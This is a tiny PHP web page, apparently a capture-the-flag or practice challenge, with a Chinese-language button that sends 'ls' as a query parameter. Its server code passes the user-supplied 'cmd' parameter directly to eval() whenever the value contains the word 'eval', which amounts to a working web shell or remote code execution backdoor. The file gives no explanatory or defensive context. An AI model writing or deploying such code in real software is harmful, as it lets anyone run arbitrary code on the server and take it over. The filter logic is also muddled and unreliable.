<?php
echo 'eval($_GET["cmd"]);';
if(!preg_match('/eval/i',$_GET['cmd'])){
    echo "hacker";
}
else{
    eval($_GET["cmd"]);
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>发送GET ls请求</title>
</head>
<body>
    <a href="?cmd=ls">
  <button>执行ls</button>
</a>
</body>
</html>